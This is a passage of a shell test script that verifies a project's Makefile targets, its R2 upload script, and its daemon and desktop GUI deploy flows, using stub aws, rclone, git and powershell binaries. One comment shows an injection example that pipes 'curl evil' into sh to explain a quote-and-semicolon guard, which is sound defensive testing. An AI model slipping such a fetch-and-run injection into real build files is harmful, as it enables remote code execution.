#!/usr/bin/env sh
set -eu

repo_dir="$(CDPATH= cd "$(dirname "$0")/.." && pwd)"
. "$repo_dir/scripts/lib/testtmp.sh"
tmp_dir="$(notty_test_mktemp notty-build-deploy-contract)"
trap 'rm -rf "$tmp_dir"' EXIT INT TERM

pass() { printf 'PASS: %s\n' "$1"; }
fail() { printf 'FAIL: %s\n' "$1" >&2; exit 1; }

release_version="$("$repo_dir/scripts/read-daemon-version.sh")"
daemon_older_version=0.0.0
daemon_newer_version=255.255.65535
[ "$release_version" != "$daemon_older_version" ] ||
	fail "daemon publication fixture needs a version newer than $daemon_older_version"
[ "$release_version" != "$daemon_newer_version" ] ||
	fail "daemon publication fixture needs a version older than $daemon_newer_version"
NOTTY_TEST_RELEASE_VERSION="$release_version"
export NOTTY_TEST_RELEASE_VERSION
AWS_ACCESS_KEY_ID=test-access-key
AWS_SECRET_ACCESS_KEY=test-secret-key
export AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY

crlf_deploy_env="$tmp_dir/crlf.deploy.env"
printf '# Windows checkout\r\n\r\nCRLF_DEPLOY_VALUE=from-file\r\nCRLF_DEPLOY_EMPTY=\r\nCRLF_DEPLOY_PRESERVED=from-file\r\n' \
	>"$crlf_deploy_env"
unset CRLF_DEPLOY_VALUE CRLF_DEPLOY_EMPTY
CRLF_DEPLOY_PRESERVED=from-process
export CRLF_DEPLOY_PRESERVED
. "$repo_dir/scripts/lib/deploy-env.sh"
load_notty_env_file "$crlf_deploy_env"
[ "$CRLF_DEPLOY_VALUE" = from-file ] || fail 'CRLF deploy env value was not loaded'
[ "${CRLF_DEPLOY_EMPTY+x}" = x ] && [ -z "$CRLF_DEPLOY_EMPTY" ] ||
	fail 'CRLF deploy env empty value was not loaded'
[ "$CRLF_DEPLOY_PRESERVED" = from-process ] || fail 'CRLF deploy env replaced an existing value'
unset CRLF_DEPLOY_VALUE CRLF_DEPLOY_EMPTY CRLF_DEPLOY_PRESERVED
pass 'deploy env loader accepts CRLF records without changing precedence'

target_count() {
	awk -v target="$1" '$0 ~ ("^" target ":[[:space:]]*$") { count++ } END { print count + 0 }' "$repo_dir/Makefile"
}

for target in \
	linux-daemon-build macos-daemon-build windows-daemon-build daemon-deploy \
	frontend-build frontend-deploy homepage-build homepage-deploy \
	backend-build backend-deploy \
	daemon-version-contract-check
do
	[ "$(target_count "$target")" -eq 1 ] || fail "$target must have exactly one Make definition"
done
for target in macos-gui-build macos-gui-deploy windows-gui-build windows-gui-deploy; do
	[ "$(target_count "$target")" -eq 2 ] || fail "$target must have exactly two host-conditional Make definitions"
done
pass 'exact build/deploy pairs are present'

uploader_source="$repo_dir/scripts/upload-r2.sh"
for required_uploader_source in \
	"command -v rclone >/dev/null 2>&1 || die 'rclone is required for R2 uploads'" \
	'need R2_ENDPOINT_URL' \
	'need AWS_ACCESS_KEY_ID' \
	'need AWS_SECRET_ACCESS_KEY' \
	'RCLONE_CONFIG_NOTTYR2_PROVIDER=Cloudflare' \
	'rclone sync "$upload_dir_src" "$upload_dir_remote" --ignore-times' \
	'rclone copyto' \
	'rclone lsjson'
do
	grep -Fq "$required_uploader_source" "$uploader_source" ||
		fail "shared R2 uploader is missing: $required_uploader_source"
done
for obsolete_uploader_source in \
	wrangler aws_s3 'command -v aws' 'uploader=' \
	CLOUDFLARE_API_TOKEN NOTTY_CLOUDFLARE_TOKEN CLOUDFLARE_ACCOUNT_ID
do
	if grep -Fiq "$obsolete_uploader_source" "$uploader_source"; then
		fail "shared R2 uploader retained obsolete implementation: $obsolete_uploader_source"
	fi
done
pass 'every R2 deploy uses one rclone-only uploader'

for target in \
	release static all promote \
	daemon-build daemon-release daemon-release-all release-daemons \
	linux-daemon-deploy macos-daemon-deploy windows-daemon-deploy \
	macos-gui-release windows-gui-release windows-gui-payloads \
	build-windows-builder-image windows-verify \
	build-frontend build-daemon build-static build-static-local build-backend-image \
	static-build static-build-local static-publish backend-image \
	publish publish-backend publish-frontend publish-static \
	deploy-static daemon-checksums \
	version-contract-check
do
	[ "$(target_count "$target")" -eq 0 ] || fail "obsolete public Make target survived: $target"
done
pass 'obsolete public target vocabulary is absent'

# The renamed deploy verbs are TOMBSTONES, not absences. #189's invariant is "one USABLE deploy
# name"; absence was only the cheapest proxy for it. A target that always exits nonzero with a
# redirect is an error message with better wording, not a second way to deploy — and asserting
# the behaviour instead of the absence is what stops a tombstone silently becoming a live alias,
# which is the failure #189 actually cared about. Five people ran `make deploy-frontend` on
# 2026-07-30 and got make's "No rule to make target", which names no cure.
for tombstone in deploy-frontend:frontend-deploy deploy-backend:backend-deploy \
	deploy-homepage:homepage-deploy deploy-daemon:daemon-deploy
do
	dead_name="${tombstone%%:*}"
	live_name="${tombstone##*:}"
	[ "$(target_count "$dead_name")" -eq 1 ] || fail "tombstone missing for renamed target: $dead_name"
	# Pin the recipe STRUCTURALLY rather than running it. The regression this guard exists to catch
	# is "the tombstone became a working alias" — and executing a dead deploy target to find that
	# out would run the production deploy under ambient credentials before the assertion could fail.
	# A guard must not be able to cause the damage it is watching for.
	tombstone_recipe="$(awk -v target="$dead_name" '
		$0 ~ ("^" target ":[[:space:]]*$") { capture = 1; next }
		capture && /^[^\t]/ { exit }
		capture { print }
	' "$repo_dir/Makefile" | sed '/^[[:space:]]*$/d')"
	[ "$(printf '%s\n' "$tombstone_recipe" | wc -l)" -eq 1 ] ||
		fail "tombstone $dead_name must be exactly one line; a multi-line recipe can do work"
	# Whitelist the exact shape rather than blacklisting dangerous substrings: a blacklist cannot
	# tell a command from the same word quoted inside the message, and anything not matching this
	# one form — printf to stderr, then exit 1 — is by construction incapable of doing work.
	case "$tombstone_recipe" in
		"$(printf '\t')@printf '"*"' >&2; exit 1") ;;
		*) fail "tombstone $dead_name must be exactly: @printf '...' >&2; exit 1 (got: $tombstone_recipe)" ;;
	esac
	# The shape alone is not enough: the message body can CLOSE the quote and open a command.
	#   @printf ''; curl evil | sh; printf 'use make frontend-deploy' >&2; exit 1
	# matches the pattern above exactly. Pinning the quote and semicolon counts makes that
	# unrepresentable rather than merely discouraged — a whitelist with a wildcard in it is still
	# a blacklist wherever the wildcard reaches.
	[ "$(printf '%s' "$tombstone_recipe" | tr -cd "'" | wc -c)" -eq 2 ] ||
		fail "tombstone $dead_name must contain exactly two quotes; more means the message closes its own quote and runs a command"
	[ "$(printf '%s' "$tombstone_recipe" | tr -cd ';' | wc -c)" -eq 1 ] ||
		fail "tombstone $dead_name must contain exactly one semicolon; more means it chains a second command"
	case "$tombstone_recipe" in
		*"$live_name"*) ;;
		*) fail "tombstone $dead_name does not name its replacement ($live_name)" ;;
	esac
done
pass 'renamed deploy targets are failing tombstones that name their replacement'

deploy_recipe="$(awk '
	/^deploy:[[:space:]]*$/ { capture = 1; next }
	capture && /^[^[:space:]]/ { exit }
	capture && /^\t/ { print }
' "$repo_dir/Makefile")"
want_deploy_recipe="$(printf '\t$(MAKE) %s\n' frontend-deploy daemon-deploy backend-deploy)"
[ "$deploy_recipe" = "$want_deploy_recipe" ] || fail "aggregate deploy order changed:\n$deploy_recipe"
case "$deploy_recipe" in
	*gui*) fail 'aggregate deploy must not include desktop GUI targets' ;;
esac
pass 'aggregate deploy is ordered and excludes desktop GUI'

# The frontend build must forward EVERY VITE_ origin the app reads at runtime — including the
# desktop GUI static base — so the production bundle binds the real R2 route instead of falling
# back to the same-origin default. A missing forward means the download modal fetches the wrong
# host even after CORS is enabled (deep-review P1).
frontend_build="$repo_dir/scripts/build-frontend.sh"
for vite_var in VITE_PUBLIC_ORIGIN VITE_API_BASE VITE_DAEMON_STATIC_BASE VITE_DESKTOP_STATIC_BASE; do
	grep -q "${vite_var}=" "$frontend_build" || fail "build-frontend.sh does not forward $vite_var to the vite build"
done
grep -q 'vite_desktop_static_base="${VITE_DESKTOP_STATIC_BASE:-${NOTTY_DESKTOP_STATIC_BASE:-$static_origin/desktop}}"' "$frontend_build" ||
	fail 'build-frontend.sh does not derive the desktop static base from the static origin'
pass 'frontend build forwards the desktop static base (VITE_DESKTOP_STATIC_BASE)'

build_fixture="$tmp_dir/build-fixture"
mkdir -p "$build_fixture/scripts" "$build_fixture/deploy/daemons"
cp "$repo_dir/scripts/build-daemon-platform.sh" "$build_fixture/scripts/build-daemon-platform.sh"
cp "$repo_dir/scripts/read-daemon-version.sh" "$build_fixture/scripts/read-daemon-version.sh"
printf '1.2.3\n' >"$build_fixture/DAEMON_VERSION"
for installer in install.sh uninstall.sh install.ps1 uninstall.ps1; do
	printf '%s\n' "$installer" >"$build_fixture/deploy/daemons/$installer"
done
cat >"$build_fixture/scripts/build-daemon-release.sh" <<'FIXTURE'
#!/usr/bin/env sh
set -eu
printf '%s|%s|%s\n' "$1" "$DIST_DIR" "$PLATFORMS" >>"$BUILD_ROUTE_LOG"
mkdir -p "$1/1.2.3"
printf '{}\n' >"$1/1.2.3/manifest.json"
printf 'sum\n' >"$1/1.2.3/SHA256SUMS"
fixture_root="$(CDPATH= cd "$(dirname "$0")/.." && pwd)"
for installer in install.sh uninstall.sh install.ps1 uninstall.ps1; do
	cp "$fixture_root/deploy/daemons/$installer" "$1/$installer"
done
FIXTURE
chmod +x "$build_fixture/scripts/"*.sh
build_dist="$tmp_dir/daemon-dist"
build_log="$tmp_dir/build-routes.log"
for platform in linux macos windows; do
	BUILD_ROUTE_LOG="$build_log" DAEMON_DIST_ROOT="$build_dist" DAEMON_ARCHES='amd64 arm64' \
		"$build_fixture/scripts/build-daemon-platform.sh" "$platform" >/dev/null
done
want_build_routes="$(cat <<ROUTES
$build_dist|$build_dist|linux/amd64 linux/arm64
$build_dist|$build_dist|darwin/amd64 darwin/arm64
$build_dist|$build_dist|windows/amd64 windows/arm64
ROUTES
)"
[ "$(cat "$build_log")" = "$want_build_routes" ] || fail 'local daemon platform build routes are not version-first or complete'
for installer in install.sh uninstall.sh install.ps1 uninstall.ps1; do
	[ -f "$build_dist/$installer" ] || fail "root daemon installer was not staged: $installer"
done
if BUILD_ROUTE_LOG="$build_log" DAEMON_DIST_ROOT="$build_dist" DAEMON_ARCHES='amd64 amd64' \
	"$build_fixture/scripts/build-daemon-platform.sh" linux >/dev/null 2>&1; then
	fail 'duplicate daemon architecture was accepted'
fi
pass 'local daemon platform builds use the version-first layout and require both unique architectures'

grep -Fq 'all_platforms="linux/amd64 linux/arm64 darwin/amd64 darwin/arm64 windows/amd64 windows/arm64"' \
	"$repo_dir/scripts/build-daemon-release.sh" || fail 'complete daemon build does not enumerate the exact six targets'
if grep -Eq 'cp .*\$out_dir/(install|uninstall)' "$repo_dir/scripts/build-daemon-release.sh"; then
	fail 'versioned daemon inventory retained stable installer copies'
fi
pass 'complete daemon build owns exactly six archives plus manifest and checksum inventories'

mkdir -p "$build_fixture/scripts/lib"
cp "$repo_dir/scripts/deploy-daemon.sh" "$build_fixture/scripts/deploy-daemon.sh"
cat >"$build_fixture/scripts/lib/deploy-env.sh" <<'FIXTURE'
load_notty_deploy_env() { :; }
FIXTURE
cat >"$build_fixture/scripts/upload-r2.sh" <<'FIXTURE'
#!/usr/bin/env sh
set -eu
printf '%s|%s\n' "$UPLOAD_TARGET" "${UPLOAD_PLATFORM-unset}" >>"$UPLOAD_ROUTE_LOG"
FIXTURE
chmod +x "$build_fixture/scripts/deploy-daemon.sh" "$build_fixture/scripts/upload-r2.sh"
: >"$build_log"
upload_route_log="$tmp_dir/daemon-upload-route.log"
BUILD_ROUTE_LOG="$build_log" UPLOAD_ROUTE_LOG="$upload_route_log" DAEMON_DIST_ROOT="$build_dist" \
	"$build_fixture/scripts/deploy-daemon.sh" >/dev/null
[ "$(cat "$build_log")" = "$build_dist|$build_dist|all" ] ||
	fail 'daemon deploy did not drive one complete sequential build'
[ "$(cat "$upload_route_log")" = 'daemon|unset' ] ||
	fail 'daemon deploy retained a per-platform upload route'
if "$build_fixture/scripts/deploy-daemon.sh" linux >/dev/null 2>&1; then
	fail 'daemon deploy accepted a platform argument'
fi
pass 'one daemon deploy rebuilds all targets and publishes once without a platform selector'

macos_deploy_fixture="$tmp_dir/macos-deploy-fixture"
mkdir -p "$macos_deploy_fixture/scripts/lib"
cp "$repo_dir/scripts/deploy-macos-gui.sh" "$macos_deploy_fixture/scripts/deploy-macos-gui.sh"
cp "$repo_dir/scripts/read-daemon-version.sh" "$macos_deploy_fixture/scripts/read-daemon-version.sh"
printf '1.2.3\n' >"$macos_deploy_fixture/DAEMON_VERSION"
cat >"$macos_deploy_fixture/scripts/lib/deploy-env.sh" <<'FIXTURE'
load_notty_deploy_env() { :; }
FIXTURE
cat >"$macos_deploy_fixture/scripts/build-macos-desktop-release.sh" <<'FIXTURE'
#!/usr/bin/env sh
set -eu
printf 'build|%s|%s\n' "$1" "${ALLOW_UNSIGNED_MACOS_DESKTOP-unset}" >>"$MACOS_DEPLOY_LOG"
FIXTURE
cat >"$macos_deploy_fixture/scripts/upload-r2.sh" <<'FIXTURE'
#!/usr/bin/env sh
set -eu
printf 'upload|%s|%s|%s\n' "$UPLOAD_TARGET" "$MACOS_GUI_DIST_DIR" \
	"${ALLOW_UNSIGNED_MACOS_DESKTOP-unset}" >>"$MACOS_DEPLOY_LOG"
FIXTURE
chmod +x "$macos_deploy_fixture/scripts/"*.sh
macos_deploy_dist="$tmp_dir/macos-deploy-dist"
macos_deploy_log="$tmp_dir/macos-deploy.log"

unset ALLOW_UNSIGNED_MACOS_DESKTOP
: >"$macos_deploy_log"
MACOS_DEPLOY_LOG="$macos_deploy_log" MACOS_GUI_DIST_DIR="$macos_deploy_dist" \
	"$macos_deploy_fixture/scripts/deploy-macos-gui.sh" >"$tmp_dir/macos-signed-deploy.output" 2>&1
want_macos_signed_routes="$(cat <<ROUTES
build|$macos_deploy_dist|unset
upload|macos-gui|$macos_deploy_dist|unset
ROUTES
)"
[ "$(cat "$macos_deploy_log")" = "$want_macos_signed_routes" ] ||
	fail 'default macOS GUI deploy did not preserve signed mode through build and upload'
grep -Fq 'Building signed and notarized macOS GUI release 1.2.3' \
	"$tmp_dir/macos-signed-deploy.output" || fail 'signed macOS GUI deploy did not report its mode'

: >"$macos_deploy_log"
ALLOW_UNSIGNED_MACOS_DESKTOP=1 MACOS_DEPLOY_LOG="$macos_deploy_log" \
	MACOS_GUI_DIST_DIR="$macos_deploy_dist" \
	"$macos_deploy_fixture/scripts/deploy-macos-gui.sh" >"$tmp_dir/macos-unsigned-deploy.output" 2>&1
want_macos_unsigned_routes="$(cat <<ROUTES
build|$macos_deploy_dist|1
upload|macos-gui|$macos_deploy_dist|1
ROUTES
)"
[ "$(cat "$macos_deploy_log")" = "$want_macos_unsigned_routes" ] ||
	fail 'unsigned macOS GUI deploy did not propagate its explicit opt-in'
grep -Fq 'WARNING: publishing without signing, notarization, stapling, or Gatekeeper trust' \
	"$tmp_dir/macos-unsigned-deploy.output" || fail 'unsigned macOS GUI deploy did not report its missing trust evidence'
grep -Fq 'macOS GUI deploy complete: 1.2.3 (UNSIGNED construction-only)' \
	"$tmp_dir/macos-unsigned-deploy.output" || fail 'unsigned macOS GUI deploy did not label its completion'

: >"$macos_deploy_log"
if ALLOW_UNSIGNED_MACOS_DESKTOP=yes MACOS_DEPLOY_LOG="$macos_deploy_log" \
	MACOS_GUI_DIST_DIR="$macos_deploy_dist" \
	"$macos_deploy_fixture/scripts/deploy-macos-gui.sh" >"$tmp_dir/macos-invalid-deploy.output" 2>&1; then
	fail 'macOS GUI deploy accepted a non-canonical unsigned override'
fi
[ ! -s "$macos_deploy_log" ] || fail 'invalid unsigned override reached macOS build or upload work'
grep -Fq 'ALLOW_UNSIGNED_MACOS_DESKTOP must be unset or exactly 1' \
	"$tmp_dir/macos-invalid-deploy.output" || fail 'invalid unsigned override failed without guidance'
pass 'macOS GUI deploy defaults to signed mode and permits one explicit unsigned publication mode'

fake_bin="$tmp_dir/bin"
mkdir -p "$fake_bin"
bsd_find_bin="$tmp_dir/bsd-find-bin"
mkdir -p "$bsd_find_bin"
no_go_bin="$tmp_dir/no-go-bin"
mkdir -p "$no_go_bin"
cat >"$bsd_find_bin/find" <<'FIND'
#!/usr/bin/env sh
set -eu
if [ "${FAIL_COMMITTED_FIND:-0}" -ne 0 ] &&
	[ "${1##*/}" = "${FAIL_COMMITTED_FIND_BASENAME:-}" ]; then
	printf '%s/SHA256SUMS\n' "$1"
	exit 75
fi
for find_arg in "$@"; do
	[ "$find_arg" != -printf ] || exit 64
done
exec "$BSD_FIND_REAL" "$@"
FIND
cat >"$bsd_find_bin/sort" <<'SORT'
#!/usr/bin/env sh
set -eu
if [ "${FAIL_COMMITTED_SORT:-0}" -ne 0 ]; then
	case "${1:-}" in
		*/committed-release-files.unsorted) exit 76 ;;
	esac
fi
exec "$BSD_SORT_REAL" "$@"
SORT
chmod +x "$bsd_find_bin/find" "$bsd_find_bin/sort"
cat >"$no_go_bin/go" <<'GO'
#!/usr/bin/env sh
set -eu
printf 'native go invoked: %s\n' "$*" >>"$NO_GO_LOG"
exit 64
GO
chmod +x "$no_go_bin/go"
bsd_find_real="$(command -v find)"
bsd_sort_real="$(command -v sort)"
source_head=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
source_base=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
export BUILD_DEPLOY_FIXTURE_GIT_REPO="$repo_dir"
export BUILD_DEPLOY_FIXTURE_GIT_HEAD="$source_head"
export BUILD_DEPLOY_FIXTURE_GIT_BASE="$source_base"
cat >"$fake_bin/aws" <<'AWS'
#!/usr/bin/env sh
set -eu
if [ -n "${AWS_LOG:-}" ]; then
	printf '%s\n' "$*" >>"$AWS_LOG"
fi

aws_object_path() {
	case "$1" in
		s3://*) printf '%s/%s\n' "$AWS_OBJECT_STORE_DIR" "${1#s3://}" ;;
		*) exit 64 ;;
	esac
}

if [ "${4:-}" = ls ]; then
	case "$5" in
		*/latest/manifest.json)
			[ "${AWS_FAIL_LATEST_READ:-0}" -eq 0 ] || exit 70
			aws_remote_file="${AWS_REMOTE_LATEST:-}"
			;;
		*/manifest.json) aws_remote_file="${AWS_REMOTE_LEDGER:-}" ;;
		*) exit 64 ;;
	esac
	if [ -n "$aws_remote_file" ] && [ -f "$aws_remote_file" ]; then
		printf '2026-01-01 00:00:00 %s manifest.json\n' "$(wc -c <"$aws_remote_file" | tr -d ' ')"
	fi
	exit 0
fi
if [ "${4:-}" = cp ]; then
	aws_source="$5"
	aws_destination="$6"
	case "$aws_source" in
		s3://*/latest/manifest.json)
			[ -n "${AWS_REMOTE_LATEST:-}" ] && [ -f "$AWS_REMOTE_LATEST" ] || exit 71
			cp "$AWS_REMOTE_LATEST" "$aws_destination"
			exit 0
			;;
		s3://*/manifest.json)
			[ -n "${AWS_REMOTE_LEDGER:-}" ] && [ -f "$AWS_REMOTE_LEDGER" ] || exit 71
			cp "$AWS_REMOTE_LEDGER" "$aws_destination"
			exit 0
			;;
	esac
fi
if [ "${4:-}" = cp ] && [ "${AWS_FAIL_VERSION_PAYLOAD:-0}" -ne 0 ]; then
	case "$6" in
		*/daemons/"$NOTTY_TEST_RELEASE_VERSION"/manifest.json) ;;
		*/daemons/"$NOTTY_TEST_RELEASE_VERSION"/*) exit 72 ;;
	esac
fi
if [ "${4:-}" = cp ] && [ "${AWS_FAIL_LATEST_SHA:-0}" -ne 0 ]; then
	case "$6" in
		*/latest/SHA256SUMS) exit 73 ;;
	esac
fi
if [ -n "${AWS_CAPTURE_DIR:-}" ] && [ "${4:-}" = cp ]; then
	aws_source="$5"
	aws_destination="$6"
	case "$aws_destination" in
		*"/desktop/windows/$NOTTY_TEST_RELEASE_VERSION/arm64/Codesk_${NOTTY_TEST_RELEASE_VERSION}_windows_arm64.msi")
			cp "$aws_source" "$AWS_CAPTURE_DIR/arm64.msi"
			;;
		*"/desktop/windows/$NOTTY_TEST_RELEASE_VERSION/arm64/SHA256SUMS")
			cp "$aws_source" "$AWS_CAPTURE_DIR/arm64.SHA256SUMS"
			;;
		*"/desktop/windows/$NOTTY_TEST_RELEASE_VERSION/manifest.json")
			cp "$aws_source" "$AWS_CAPTURE_DIR/manifest.json"
			;;
	esac
fi
if [ -n "${DAEMON_CAPTURE_DIR:-}" ] && [ "${4:-}" = cp ]; then
	case "$6" in
		*"/daemons/$NOTTY_TEST_RELEASE_VERSION/notty-daemon_${NOTTY_TEST_RELEASE_VERSION}_linux_arm64.tar.gz")
			cp "$5" "$DAEMON_CAPTURE_DIR/notty-daemon_${NOTTY_TEST_RELEASE_VERSION}_linux_arm64.tar.gz"
			;;
		*"/daemons/$NOTTY_TEST_RELEASE_VERSION/SHA256SUMS")
			cp "$5" "$DAEMON_CAPTURE_DIR/SHA256SUMS"
			;;
		*"/daemons/$NOTTY_TEST_RELEASE_VERSION/manifest.json")
			cp "$5" "$DAEMON_CAPTURE_DIR/manifest.json"
			;;
	esac
fi
if [ -n "${AWS_OBJECT_STORE_DIR:-}" ] && [ "${4:-}" = cp ]; then
	aws_source="$5"
	aws_destination="$6"
	case "$aws_destination" in
		s3://*)
			if [ -n "${AWS_LEDGER_ASSERT_COMMIT_URI:-}" ] &&
				[ "$aws_destination" = "$AWS_LEDGER_ASSERT_COMMIT_URI" ]; then
				[ -n "${AWS_LEDGER_ASSERT_PAYLOAD_URI:-}" ] &&
					[ -n "${AWS_LEDGER_ASSERT_PAYLOAD_SOURCE:-}" ] || exit 64
				aws_assert_payload_path="$(aws_object_path "$AWS_LEDGER_ASSERT_PAYLOAD_URI")"
				if [ ! -f "$aws_assert_payload_path" ] ||
					! cmp -s "$AWS_LEDGER_ASSERT_PAYLOAD_SOURCE" "$aws_assert_payload_path"; then
					printf 'ledger commit preceded unconditional payload replacement: %s\n' \
						"$AWS_LEDGER_ASSERT_PAYLOAD_URI" >&2
					exit 74
				fi
				if [ -n "${AWS_LEDGER_ASSERT_LOG:-}" ]; then
					printf '%s\n' "$aws_destination" >>"$AWS_LEDGER_ASSERT_LOG"
				fi
			fi
			aws_destination_path="$(aws_object_path "$aws_destination")"
			mkdir -p "$(dirname "$aws_destination_path")"
			cp "$aws_source" "$aws_destination_path"
			;;
	esac
fi
if [ -n "${AWS_OBJECT_STORE_DIR:-}" ] && [ "${4:-}" = sync ]; then
	aws_sync_source="${5%/}"
	aws_sync_destination="${6%/}"
	aws_sync_exclude_manifest=0
	case " $* " in
		*" --exclude manifest.json "*) aws_sync_exclude_manifest=1 ;;
	esac
	find "$aws_sync_source" -type f | LC_ALL=C sort | while IFS= read -r aws_sync_file; do
		aws_sync_rel="${aws_sync_file#"$aws_sync_source"/}"
		if [ "$aws_sync_exclude_manifest" -eq 1 ] && [ "$aws_sync_rel" = manifest.json ]; then
			continue
		fi
		aws_sync_uri="$aws_sync_destination/$aws_sync_rel"
		aws_sync_path="$(aws_object_path "$aws_sync_uri")"
		mkdir -p "$(dirname "$aws_sync_path")"
		if [ ! -f "$aws_sync_path" ] ||
			[ "$(wc -c <"$aws_sync_file" | tr -d ' ')" -ne "$(wc -c <"$aws_sync_path" | tr -d ' ')" ]; then
			cp "$aws_sync_file" "$aws_sync_path"
		fi
	done
fi
AWS
cat >"$fake_bin/rclone" <<'RCLONE'
#!/usr/bin/env sh
set -eu
[ "${RCLONE_CONFIG_NOTTYR2_TYPE:-}" = s3 ]
[ "${RCLONE_CONFIG_NOTTYR2_PROVIDER:-}" = Cloudflare ]
[ "${RCLONE_CONFIG_NOTTYR2_ENV_AUTH:-}" = true ]
[ "${RCLONE_CONFIG_NOTTYR2_ENDPOINT:-}" = https://example.invalid ]
[ "${RCLONE_CONFIG_NOTTYR2_REGION:-}" = auto ]
if [ -n "${RCLONE_LOG:-}" ]; then
	printf '%s\n' "$*" >>"$RCLONE_LOG"
fi
if [ "${1:-}" = sync ]; then
	rclone_source="${2%/}"
	rclone_destination="${3%/}"
	case "$rclone_destination" in
		nottyr2:*) ;;
		*) exit 64 ;;
	esac
	shift 3
	rclone_cache_control=
	while [ "$#" -gt 0 ]; do
		case "$1" in
			--no-check-dest) exit 64 ;;
			--header-upload)
				case "$2" in
					'Cache-Control: '*) rclone_cache_control="${2#Cache-Control: }" ;;
				esac
				shift 2
				;;
			*) shift ;;
		esac
	done
	"$(dirname "$0")/aws" --endpoint-url https://example.invalid s3 sync \
		"$rclone_source/" "s3://${rclone_destination#nottyr2:}/" \
		--delete --cache-control "$rclone_cache_control"
	exit "$?"
fi
if [ "${1:-}" = lsjson ]; then
	rclone_source="$2"
	case "$rclone_source" in
		nottyr2:*) ;;
		*) exit 64 ;;
	esac
	case "$rclone_source" in
		*/latest/manifest.json)
			[ "${AWS_FAIL_LATEST_READ:-0}" -eq 0 ] || exit 70
			;;
	esac
	rclone_stat_file="${TMPDIR:-/tmp}/notty-rclone-stat.$$"
	set +e
	"$(dirname "$0")/aws" --endpoint-url https://example.invalid s3 cp \
		"s3://${rclone_source#nottyr2:}" "$rclone_stat_file"
	rclone_status="$?"
	set -e
	if [ "$rclone_status" -eq 71 ]; then
		printf 'null\n'
		exit 0
	fi
	[ "$rclone_status" -eq 0 ] || exit "$rclone_status"
	rm -f "$rclone_stat_file"
	printf '{"Path":"manifest.json","Name":"manifest.json","Size":1,"IsDir":false}\n'
	exit 0
fi
[ "${1:-}" = copyto ] || exit 64
rclone_source="$2"
rclone_destination="$3"
case "$rclone_source" in
	nottyr2:*)
		case "$rclone_source" in
			*/latest/manifest.json)
				[ "${AWS_FAIL_LATEST_READ:-0}" -eq 0 ] || exit 70
				;;
		esac
		set +e
		"$(dirname "$0")/aws" --endpoint-url https://example.invalid s3 cp \
			"s3://${rclone_source#nottyr2:}" "$rclone_destination"
		rclone_status="$?"
		set -e
		[ "$rclone_status" -ne 71 ] || exit 0
		exit "$rclone_status"
		;;
esac
case "$rclone_destination" in
	nottyr2:*) ;;
	*) exit 64 ;;
esac
if [ -n "${RCLONE_FAIL_PAYLOAD_KEY:-}" ] &&
	[ "${rclone_destination#nottyr2:}" = "$RCLONE_FAIL_PAYLOAD_KEY" ]; then
	exit 76
fi
shift 3
rclone_content_type=
rclone_cache_control=
while [ "$#" -gt 0 ]; do
	case "$1" in
		--header-upload)
			case "$2" in
				'Content-Type: '*) rclone_content_type="${2#Content-Type: }" ;;
				'Cache-Control: '*) rclone_cache_control="${2#Cache-Control: }" ;;
			esac
			shift 2
			;;
		*) shift ;;
	esac
done
"$(dirname "$0")/aws" --endpoint-url https://example.invalid s3 cp \
	"$rclone_source" "s3://${rclone_destination#nottyr2:}" \
	--content-type "$rclone_content_type" --cache-control "$rclone_cache_control"
RCLONE
cat >"$fake_bin/git" <<'GIT'
#!/usr/bin/env sh
set -eu

if [ "$#" -ne 5 ] ||
	[ "$1" != -C ] ||
	[ "$2" != "$BUILD_DEPLOY_FIXTURE_GIT_REPO" ] ||
	[ "$3" != rev-parse ] ||
	[ "$4" != --verify ]; then
	printf 'unexpected git invocation\n' >&2
	exit 64
fi

case "$5" in
	HEAD) printf '%s\n' "$BUILD_DEPLOY_FIXTURE_GIT_HEAD" ;;
	'HEAD^1') printf '%s\n' "$BUILD_DEPLOY_FIXTURE_GIT_BASE" ;;
	*)
		printf 'unexpected git revision: %s\n' "$5" >&2
		exit 64
		;;
esac
GIT
cat >"$fake_bin/powershell.exe" <<'POWERSHELL'
#!/usr/bin/env sh
set -eu
msi_root=
version=
source_head=
source_base=
repository=
while [ "$#" -gt 0 ]; do
	case "$1" in
		-MsiRoot) msi_root="$2"; shift 2 ;;
		-Version) version="$2"; shift 2 ;;
		-SourceHead) source_head="$2"; shift 2 ;;
		-SourceBase) source_base="$2"; shift 2 ;;
		-Repository) repository="$2"; shift 2 ;;
		*) shift ;;
	esac
done
[ -n "$msi_root" ] && [ -n "$version" ] && [ -n "$source_head" ] && [ -n "$source_base" ] && [ -n "$repository" ]
for arch in amd64 arm64; do
	case "$arch" in
		amd64) native=AMD64; installer=x64 ;;
		arm64) native=ARM64; installer=arm64 ;;
	esac
	provenance="$msi_root/$arch/provenance.json"
	msi="Codesk_${version}_windows_${arch}.msi"
	grep -Fq '"schemaVersion":2' "$provenance"
	grep -Fq "\"repository\":\"$repository\"" "$provenance"
	grep -Fq '"event":"push"' "$provenance"
	grep -Fq "\"checkoutCommit\":\"$source_head\"" "$provenance"
	grep -Fq "\"sourceHead\":\"$source_head\"" "$provenance"
	grep -Fq "\"sourceBase\":\"$source_base\"" "$provenance"
	grep -Fq "\"workflowRef\":\"local/scripts/run-windows-gui-target.ps1@$source_head\"" "$provenance"
	grep -Fq "\"architecture\":\"$native\"" "$provenance"
	grep -Fq "\"goArchitecture\":\"$arch\"" "$provenance"
	grep -Fq "\"installerPlatform\":\"$installer\"" "$provenance"
	grep -Fq '"buildMode":"release"' "$provenance"
	grep -Fq '"publishable":true' "$provenance"
	grep -Fq "\"version\":\"$version\"" "$provenance"
	grep -Fq "\"canonicalFile\":\"$msi\"" "$provenance"
	grep -Fq "\"name\":\"$version+$arch\"" "$provenance"
done
if [ -n "${WINDOWS_GUI_MUTATE_SOURCE_ROOT:-}" ]; then
	printf 'post-staging mutation\n' >>"$WINDOWS_GUI_MUTATE_SOURCE_ROOT/arm64/Codesk_${version}_windows_arm64.msi"
fi
POWERSHELL
chmod +x "$fake_bin/aws" "$fake_bin/rclone" "$fake_bin/git" "$fake_bin/powershell.exe"
aws_log="$tmp_dir/aws.log"

fixture_sha256() {
	if command -v sha256sum >/dev/null 2>&1; then
		sha256sum "$1" | awk '{ print $1 }'
	else
		shasum -a 256 "$1" | awk '{ print $1 }'
	fi
}

preseed_equal_size_mismatch() {
	preseed_source="$1"
	preseed_destination="$2"
	mkdir -p "$(dirname "$preseed_destination")"
	sed '1s/^./X/' "$preseed_source" >"$preseed_destination"
